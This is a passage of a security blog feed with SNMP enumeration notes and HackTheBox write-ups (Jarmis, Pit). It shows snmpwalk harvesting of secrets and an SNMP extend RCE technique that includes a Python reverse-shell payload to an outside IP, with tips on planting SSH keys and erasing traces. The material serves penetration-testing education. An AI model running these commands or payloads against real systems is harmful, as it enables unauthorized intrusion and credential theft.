HOST-RESOURCES-MIB::hrSWRunName.1 = STRING: &quot;systemd&quot;
HOST-RESOURCES-MIB::hrSWRunName.2 = STRING: &quot;kthreadd&quot;
[..]
HOST-RESOURCES-MIB::hrSWRunName.617 = STRING: &quot;python&quot;
</code></pre>
<p>process details, with secrets passed in the command-line &hellip;</p>
<pre><code>snmpwalk -v 2c -c public 10.10.10.92 hrSWRunTable | grep 617
HOST-RESOURCES-MIB::hrSWRunPath.617 = STRING: &quot;python&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.617 = STRING: &quot;-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/&quot;
</code></pre>
<p>command-line arguments:</p>
<pre><code>snmpwalk -v1 -c public 10.10.10.241 hrSWRunParameters | egrep -v &quot;= \&quot;\&quot;$&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.1 = STRING: &quot;--switched-root --system --deserialize 18&quot;
HOST-RESOURCES-MIB::hrSWRunParameters.993 = STRING: &quot;-i --logger=files&quot;
[..]
</code></pre>
<p>interesting directories and path we could not bruteforce with fuzzing techniques:</p>
<pre><code>STRING: /var/www/html/seeddms51x/seeddms
</code></pre>
<p>information about monitored processes or memory usage:</p>
<pre><code>NET-SNMP-EXTEND-MIB::nsExtendCommand.&quot;monitoring&quot; = STRING: /usr/bin/monitor
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.&quot;monitoring&quot; = STRING: Memory usage
</code></pre>
<p>ipv6 addresses, very useful to rescan <code>nmap -6</code> or try FTP &hellip; especially when iptables or firewalld blocks ipv4 but not ipv6:</p>
<pre><code>IP-MIB::ipAddressIfIndex.ipv6.&quot;de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:be:08&quot; = INTEGER: 2
IP-MIB::ipAddressIfIndex.ipv6.&quot;fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:be:08&quot; = INTEGER:
</code></pre>
<p>You can rewrite those ipv6 address with:</p>
<pre><code>snmpwalk -v2c -c public 10.10.10.20 ipAddressIfIndex.ipv6 | cut -d'&quot;' -f2 | sed -E 's/(.{2}):(.{2})/\1\2/g'
dead:beef:0000:0000:0250:56ff:feb9:3abb
fe80:0000:0000:0000:0250:56ff:feb9:be08
</code></pre>
<p>Secrets, Passwords, hashes and serial numbers you can break with <code>haschat</code> or <code>john</code></p>
<pre><code>STRING: &quot;IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43&quot;
STRING: &quot;SN#NET_45JDX23&quot;
</code></pre>
<p>usernames, email addresses:</p>
<pre><code>NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.25 = STRING: Login Name           SELinux User         MLS/MCS Range        Service
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.26 = STRING:
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.27 = STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.28 = STRING: michelle             user_u               s0                   *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;monitoring&quot;.29 = STRING: root                 unconfined_u         s0-s0:c0.c1023       *
</code></pre>
<h2 id="troubleshoot-hanging-issues">Troubleshoot hanging issues</h2>
<p>We may suffer timeout issues from time-to-time. This is because UDP is not a connected protocol like TCP having failover to retry in case of error, and therefore, if network or server CPU or memory is crippled, then packet are lost or may never be sent. As an example:</p>
<p>When snmpwalk hangs for a certain OID, a first approach to keep progressing in our snmp walk-through
is to add <code>-t 120 -r3</code> to extend timeout to 120 seconds and retry 3 times.
It may not work is the problem is due to server misconfiguration or service failure.
As an example on <a href="https://0xade1.github.io/posts/2021/10/htb-pit/">HTB - pit</a> I was not able to finish the snmpwalk execution.</p>
<pre><code>snmpwalk -v1 -c public 10.10.10.241 nsExtendOutputFull -r 5 -t 120
NET-SNMP-EXTEND-MIB::nsExtendOutputFull.&quot;monitoring&quot; = STRING: Memory usage
&lt;it hangs here, no more output&gt;
</code></pre>
<p>Sadly, there is no such a thing like an ignore list to skip MIBS with snmpwalk. However we can explicitly pass a list of MIBS to explore so the documentation may be very handy; except when it is deprecated as in doc on <a href="http://www.net-snmp.org/docs/mibs/netSnmpExtendMIB.html#netSnmpExtendMIB">NET-SNMP-EXTEND-MIB</a> where no details available :(</p>
<p>instead we can investigate parent OIDs going up the tree of MIBS definition as shown below:</p>
<pre><code>snmptranslate -On -IR NET-SNMP-EXTEND-MIB::nsExtendOutputFull
.1.3.6.1.4.1.8072.1.3.2.3.1.2

snmptranslate .1.3.6.1.4.1.8072.1.3.2.3.1
NET-SNMP-EXTEND-MIB::nsExtendOutput1Entry

snmptranslate .1.3.6.1.4.1.8072.1.3.2.3
NET-SNMP-EXTEND-MIB::nsExtendOutput1Table

snmptranslate .1.3.6.1.4.1.8072.1.3.2
NET-SNMP-EXTEND-MIB::nsExtendObjects
</code></pre>
<p>Once we found an interesting parent we can display its subtree with:</p>
<pre tabindex="0"><code>snmptranslate -Tp NET-SNMP-EXTEND-MIB::nsExtendObjects
+--nsExtendObjects(2)
   |
   +-- [..]
   |
   +--nsExtendOutput1Table(3)
   |  |
   |  +--nsExtendOutput1Entry(1)
   |     |
   |     +-- -R-- String    nsExtendOutput1Line(1)
   |     |        Textual Convention: DisplayString
   |     |        Size: 0..255
   |     +-- -R-- String    nsExtendOutputFull(2)
   |     |        Textual Convention: DisplayString
   |     |        Size: 0..255
   |     +-- -R-- Integer32 nsExtendOutNumLines(3)
   |     +-- -R-- Integer32 nsExtendResult(4)
   |
   +--nsExtendOutput2Table(4)
      |
      +--nsExtendOutput2Entry(1)
         |  Index: nsExtendToken, nsExtendLineIndex
         |
         +-- ---- INTEGER   nsExtendLineIndex(1)
         |        Range: 1..1024
         +-- -R-- String    nsExtendOutLine(2)
                  Textual Convention: DisplayString
                  Size: 0..255
</code></pre><p>We can now explore <strong>nsExtendOutput2Entry</strong> and any other interesting MIBS we could not access.</p>
<h2 id="ipv6-enumeration-through-snmp">ipv6 enumeration through snmp</h2>
<p><a href="https://github.com/trickster0/Enyx">Enyx</a> is a github project performing ipv6 enumeration. Especially useful if snmpwalk is installed and you don&rsquo;t want to spend too much effort with OID and MIBS.</p>
<p>Though, snmp version and community-string are still needed</p>
<pre tabindex="0"><code>python /opt/Enyx/enyx.py 2c public 10.10.10.92
###################################################################################
#                                                                                 #
#                      #######     ##      #  #    #  #    #                      #
#                      #          #  #    #    #  #    #  #                       #
#                      ######    #   #   #      ##      ##                        #
#                      #        #    # #        ##     #  #                       #
#                      ######  #     ##         ##    #    #                      #
#                                                                                 #
#                           SNMP IPv6 Enumerator Tool                             #
#                                                                                 #
#                   Author: Thanasis Tserpelis aka Trickster0                     #
#                                                                                 #
###################################################################################


[+] Snmpwalk found.
[+] Grabbing IPv6.
[+] Loopback -&gt; 0000:0000:0000:0000:0000:0000:0000:0001
[+] Unique-Local -&gt; dead:beef:0000:0000:0250:56ff:fe8f:ddd4
[+] Link Local -&gt; fe80:0000:0000:0000:0250:56ff:fe8f:ddd4
</code></pre><h2 id="abusing-linux-snmp-for-rce">(Ab)using Linux SNMP for RCE</h2>
<p>MUST READ: <a href="https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/">https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/</a></p>
<h3 id="example-of-successful-exploitation">Example of successful exploitation</h3>
<p>When the community string is writable, we can add a command for execution with <code>createAndGo</code> nsExtendStatus:</p>
<pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
    'nsExtendStatus.&quot;evilcommand&quot;'  = createAndGo \
    'nsExtendCommand.&quot;evilcommand&quot;' = /bin/echo \
    'nsExtendArgs.&quot;evilcommand&quot;'    = 'hello world'
</code></pre>
<p>After that, you can access your new command with snmpwalk, equally the command that was configured in the snmpd configuration file:</p>
<pre><code>snmpwalk -v2c -c c0nfig localhost nsExtendObjects | grep &quot;evilcommand&quot;
NET-SNMP-EXTEND-MIB::nsExtendCommand.&quot;evilcommand&quot; = STRING: /bin/echo
NET-SNMP-EXTEND-MIB::nsExtendArgs.&quot;evilcommand&quot; = STRING: hello world
NET-SNMP-EXTEND-MIB::nsExtendInput.&quot;evilcommand&quot; = STRING:
NET-SNMP-EXTEND-MIB::nsExtendCacheTime.&quot;evilcommand&quot; = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType.&quot;evilcommand&quot; = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType.&quot;evilcommand&quot; = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage.&quot;evilcommand&quot; = INTEGER: volatile(2)
NET-SNMP-EXTEND-MIB::nsExtendStatus.&quot;evilcommand&quot; = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.&quot;evilcommand&quot; = STRING: hello world
NET-SNMP-EXTEND-MIB::nsExtendOutputFull.&quot;evilcommand&quot; = STRING: hello world
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.&quot;evilcommand&quot; = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult.&quot;evilcommand&quot; = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&quot;evilcommand&quot;.1 = STRING: hello world
</code></pre>
<p>Why not abusing the <code>/bin/echo</code> or another binary to upload or modify a public ssh_key into /root/.ssh/authorized_keys, or get a reverse shell? It is indeed possible to overwrite arguments or command:</p>
<pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
    'nsExtendArgs.&quot;evilcommand&quot;'    = 'modified argument'
</code></pre>
<p>To get a reverse shell, if <code>nsExtendExecType = exec(1)</code>, you can use any reverse shell.</p>
<pre><code>snmpwalk -Os -v1 -c public 10.10.10.241 nsExtendExecType
nsExtendExecType.&quot;monitoring&quot; = INTEGER: exec(1)
</code></pre>
<p>However, if <code>nsExtendExecType = shell(2)</code> , you cannot use a one line bash reverse shell but a python/perl reverse shell work just fine. Get a reverse shell with python:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">snmpset <span style="color:#ff79c6">-</span>m <span style="color:#ff79c6">+</span>NET<span style="color:#ff79c6">-</span>SNMP<span style="color:#ff79c6">-</span>EXTEND<span style="color:#ff79c6">-</span>MIB <span style="color:#ff79c6">-</span>v <span style="color:#bd93f9">2</span>c <span style="color:#ff79c6">-</span>c c0nfig localhost \
    <span style="color:#f1fa8c">&#39;nsExtendStatus.&#34;evilcommand&#34;&#39;</span>  <span style="color:#ff79c6">=</span> createAndGo \
    <span style="color:#f1fa8c">&#39;nsExtendCommand.&#34;evilcommand&#34;&#39;</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">/</span>usr<span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">bin</span><span style="color:#ff79c6">/</span>python \
    <span style="color:#f1fa8c">&#39;nsExtendArgs.&#34;evilcommand&#34;&#39;</span>    <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;-c &#34;import sys,socket,os,pty;s=socket.socket();s.connect((</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">192.168.239.210</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">,8888));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">/bin/sh</span><span style="color:#f1fa8c">\&#34;</span><span style="color:#f1fa8c">)&#34;&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>And we can delete our traces with the <code>destroy</code>, which will delete our command.</p>
<pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
    'nsExtendArgs.&quot;evilcommand&quot;'    = 'modified argument'
</code></pre>
<h3 id="example-of-failure-to-write">Example of failure to write</h3>
<pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c public 10.10.10.241 \
&gt; 'nsExtendStatus.&quot;evilcommand&quot;' = createAndGo \
&gt; 'nsExtendCommand.&quot;evilcommand&quot;' = /bin/echo \
&gt; 'nsExtendArgs.&quot;evilcommand&quot;' = 'hello world'
</code></pre>
<p>output:</p>
<pre><code>Error in packet.
Reason: noAccess
Failed object: NET-SNMP-EXTEND-MIB::nsExtendStatus.&quot;evilcommand&quot;
</code></pre>
]]></content></item><item><title>HTB - Jarmis</title><link>https://0xade1.github.io/posts/2021/10/htb-jarmis/</link><pubDate>Sat, 02 Oct 2021 18:08:06 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-jarmis/</guid><description>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 rustscan 10.10.11.117 [&amp;gt;] The Nmap command to be run is nmap -vvv -p 22,80 10.10.11.117 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack nmap -p22,80 -sC -sV 10.10.11.117 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http nginx 1.</description><content type="html"><![CDATA[<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rustscan 10.10.11.117
<span style="color:#ff79c6">[</span>&gt;<span style="color:#ff79c6">]</span> The Nmap <span style="color:#8be9fd;font-style:italic">command</span> to be run is nmap -vvv -p 22,80 10.10.11.117

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

nmap -p22,80 -sC -sV 10.10.11.117

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
| ssh-hostkey:
|   <span style="color:#bd93f9">3072</span> ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
|   <span style="color:#bd93f9">256</span> b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
|_  <span style="color:#bd93f9">256</span> 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
80/tcp open  http    nginx 1.18.0 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
|_http-server-header: nginx/1.18.0 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
|_http-title: Jarmis
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></td></tr></table>
</div>
</div><p>Nginx has no known vulnerabilities</p>
<h1 id="netcat">Netcat</h1>
<p>Request:</p>
<pre><code>GET /api/v1/fetch?endpoint=http://10.10.14.53 HTTP/1.1
Host: jarmis.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://jarmis.htb/
DNT: 1
Connection: close
</code></pre>
<p>Response:</p>
<pre><code>HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 03 Oct 2021 19:56:21 GMT
Content-Type: application/json
Content-Length: 122
Connection: close

{&quot;sig&quot;:&quot;00000000000000000000000000000000000000000000000000000000000000&quot;,&quot;endpoint&quot;:&quot;10.10.14.53:443&quot;,&quot;note&quot;:&quot;10.10.14.53&quot;}
</code></pre>
<p>Netcat:</p>
<pre tabindex="0"><code>sudo nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 172.19.0.1 59564
%\H2Q(&amp;\+cBy]
                ;m 0=]Ta^YaB9
                             1m3g9kE    #+
$,r_'/(0`av_
/&lt;5=A
     10.10.14.53


3&amp;$ {~Vch2spdy/3spdy/2spdy/http/1.http/1.http/0.9
       9q\5o
            %t_-+
</code></pre>]]></content></item><item><title>HTB - Pit</title><link>https://0xade1.github.io/posts/2021/10/htb-pit/</link><pubDate>Sat, 02 Oct 2021 18:04:13 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-pit/</guid><description>Rustscan miserably fails to find port 9090
rustscan 10.10.10.241 Old good nmap is more reliable:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 nmap -vvv -p- -T4 --min-rate=3000 10.10.10.241 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack 9090/tcp open zeus-admin syn-ack nmap -p22,80,9090 -sC -sV -T4 10.10.10.241 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.</description><content type="html"><![CDATA[<p><img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse2.mm.bing.net%2Fth%3Fid%3DOIP.-PQhNZFI16lKFUGotjn-EQHaCz%26pid%3DApi&amp;f=1" alt="SELinux"></p>
<p>Rustscan miserably fails to find port 9090</p>
<pre><code>rustscan 10.10.10.241
</code></pre>
<p>Old good nmap is more reliable:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nmap -vvv -p- -T4 --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3000</span> 10.10.10.241

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
9090/tcp open  zeus-admin syn-ack

nmap -p22,80,9090 -sC -sV -T4 10.10.10.241

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 <span style="color:#ff79c6">(</span>protocol 2.0<span style="color:#ff79c6">)</span>
| ssh-hostkey:
|   <span style="color:#bd93f9">3072</span> 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
|   <span style="color:#bd93f9">256</span> c2:6f:f8🆎a1:20:83:d1:60🆎cf:63:2d:c8:65:b7 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
|_  <span style="color:#bd93f9">256</span> 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
80/tcp   open  http            nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page <span style="color:#ff79c6">for</span> the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin?
|_    <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
| ssl-cert: Subject: <span style="color:#8be9fd;font-style:italic">commonName</span><span style="color:#ff79c6">=</span>dms-pit.htb/organizationName<span style="color:#ff79c6">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span style="color:#ff79c6">=</span>US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
</code></pre></td></tr></table>
</div>
</div><p>Nginx has no known vulnerabilities</p>
<p>gobuster is not revealing anything interesting on dms-pit.htb domain</p>
<h2 id="udp-scan">UDP Scan</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo nmap -sU -sV --top-ports <span style="color:#bd93f9">10</span>  10.10.10.241

PORT     STATE    SERVICE      VERSION
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
161/udp  open     snmp         SNMPv1 server; net-snmp SNMPv3 server <span style="color:#ff79c6">(</span>public<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p><a href="https://0xade1.github.io/posts/2021/10/dont-overlook-snmp-mibs-exploration/#discover-a-community-string-with-onesixtyone">onesixtyone</a> is an enumeration tool to find SNMP community string. We find the <code>public</code> community string.</p>
<pre><code>onesixtyone 10.10.10.241
[..]
10.10.10.241 [public] Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_6
</code></pre>
<p>Installing snmwalk with mibs extension allows to reveal some web root we could not fuzz with our dictionary:</p>
<pre><code>snmpwalk -v1 -c public 10.10.10.241 dskPath
UCD-SNMP-MIB::dskPath.1 = STRING: /
UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/htmly/seeddms51x/seeddms
</code></pre>
<p><strong><a href="http://dms-pit.htb/seeddms51x/seeddms">http://dms-pit.htb/seeddms51x/seeddms</a></strong> is the sign in page for SeedDMS free document management system - <a href="http://www.seeddms.org">www.seeddms.org</a> and according to response header, it is run with <code>X-Powered-By PHP/7.2.24</code></p>
<p>We suffer from a timeout issue which prevents us to walk through any OID as it hangs. Adding <code>-t 120 -r3</code> to extend timeout and retry did not work:</p>
<pre><code>NET-SNMP-EXTEND-MIB::nsExtendOutputFull.&quot;monitoring&quot; = STRING: Memory usage
&lt;it hangs here, no more output&gt;
</code></pre>
<p>At this stage I suspect the service may be broken, and refer to the documentation. Unfortunately, the doc on <a href="http://www.net-snmp.org/docs/mibs/netSnmpExtendMIB.html#netSnmpExtendMIB">NET-SNMP-EXTEND-MIB</a> is Deprecated and I can&rsquo;t get more details. We can still <a href="https://0xade1.github.io/posts/2021/10/dont-overlook-snmp-mibs-exploration/#troubleshoot-hanging-issues">troubleshoot snmp with this technique</a> by moving up the tree then expanding the MIBS tree definition, to see what else we could not explore due to this timeout issue.</p>
<pre><code>snmptranslate -On -IR NET-SNMP-EXTEND-MIB::nsExtendOutputFull
.1.3.6.1.4.1.8072.1.3.2.3.1.2

snmptranslate .1.3.6.1.4.1.8072.1.3.2.3.1
NET-SNMP-EXTEND-MIB::nsExtendOutput1Entry

snmptranslate .1.3.6.1.4.1.8072.1.3.2.3
NET-SNMP-EXTEND-MIB::nsExtendOutput1Table

snmptranslate .1.3.6.1.4.1.8072.1.3.2
NET-SNMP-EXTEND-MIB::nsExtendObjects
</code></pre>
<p>I can now display the entire subtree to find interesting MIBS:</p>
<pre tabindex="0"><code>snmptranslate -Tp NET-SNMP-EXTEND-MIB::nsExtendObjects
+--nsExtendObjects(2)
   |
   +-- [..]
   |
   +--nsExtendOutput1Table(3)
   |  |
   |  +--nsExtendOutput1Entry(1)
   |     |
   |     +-- -R-- String    nsExtendOutput1Line(1)
   |     |        Textual Convention: DisplayString
   |     |        Size: 0..255
   |     +-- -R-- String    nsExtendOutputFull(2)
   |     |        Textual Convention: DisplayString
   |     |        Size: 0..255
   |     +-- -R-- Integer32 nsExtendOutNumLines(3)
   |     +-- -R-- Integer32 nsExtendResult(4)
   |
